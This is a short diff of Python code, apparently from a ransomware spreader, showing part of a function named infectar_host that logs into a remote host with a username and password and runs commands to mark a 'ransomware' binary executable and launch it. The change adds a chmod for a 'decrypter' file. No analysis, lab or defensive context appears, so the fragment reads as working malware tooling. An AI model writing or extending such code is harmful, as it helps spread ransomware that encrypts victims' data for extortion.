@@ -53,10 +53,11 @@ def infectar_host(ip, usuario, senha):
 
         # 2. Comandos remotos:
         cmd_chmod = "chmod +x ransomware"
+        cmd_chmod2 = "chmod +x decrypter"
         cmd_run = "./ransomware"
         
         logging.info(f"Iniciando execução remota do payload em {ip}...")
-        client.exec_command(f"{cmd_chmod} && {cmd_run}")
+        client.exec_command(f"{cmd_chmod} && {cmd_chmod2} && {cmd_run}")
         client.close()
         logging.info(f"Payload disparado com sucesso em {ip}.")
         return True
